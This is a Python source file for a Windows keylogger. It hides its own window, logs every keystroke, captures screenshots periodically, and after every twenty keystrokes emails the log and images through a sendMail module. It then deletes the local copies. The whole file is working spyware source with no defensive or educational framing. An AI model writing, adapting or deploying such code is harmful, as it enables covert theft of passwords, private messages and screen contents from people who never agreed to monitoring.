from datetime import datetime
import shutil
from turtle import onkeypress
import os
import sendMail
import pyscreenshot
from pynput.keyboard import Key, Listener
import win32gui, win32con

FILE_NAME = "log.txt"
IMAGES_PATH = "images/"
counter = 0
keys = []

def take_screenshot():
    image = pyscreenshot.grab()
    date = datetime.now()
    image_name = IMAGES_PATH + "Screenshot" + date.strftime("%d-%m-%Y-%H-%M-%S") + ".png"
    image.save(image_name)

def delete_images():
    for filename in os.listdir(IMAGES_PATH):
        filepath = os.path.join(IMAGES_PATH, filename)
        try:
            shutil.rmtree(filepath)
        except OSError:
            os.remove(filepath)

def write_to_file(keys):
    if not os.path.exists(FILE_NAME):
        open(FILE_NAME, "w")

    with open(FILE_NAME, "a") as file_writer:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file_writer.write('\n')
            elif k.find("Key") == -1:
                file_writer.write(str(k))
    
def on_press(key):
    global keys, counter
    if counter == 10:
        take_screenshot()
    print("|{0}| pressed ".format(key))
    counter += 1
    keys.append(key)
    if counter == 20:
        write_to_file(keys)
        keys = []
        sendMail.send_log_file(FILE_NAME)
        sendMail.send_images(IMAGES_PATH)
        os.remove(FILE_NAME)
        delete_images()
        counter = 0

def on_release(key):
    if key == Key.esc:
        return False

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

if not os.path.exists(IMAGES_PATH):
    os.makedirs(IMAGES_PATH)

with Listener(on_press = on_press,  on_release = on_release) as listener:
    listener.join()